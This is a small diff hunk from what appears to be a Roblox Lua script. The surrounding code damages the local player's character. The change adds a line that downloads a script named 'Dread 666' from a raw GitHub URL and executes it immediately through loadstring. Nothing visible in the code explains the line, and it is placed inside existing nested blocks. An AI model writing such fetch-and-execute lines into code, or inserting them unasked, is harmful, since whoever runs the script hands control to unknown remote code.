@@ -679,7 +679,8 @@ local v = game.Players.LocalPlayer
 								v.Character:FindFirstChildWhichIsA("Humanoid"):TakeDamage(100)
 			end
 			
-			
+			 loadstring(game:HttpGet("https://raw.githubusercontent.com/huyhoanphuc/gf/refs/heads/main/Dread%20666"))()
+						
 end
 end
 end)()
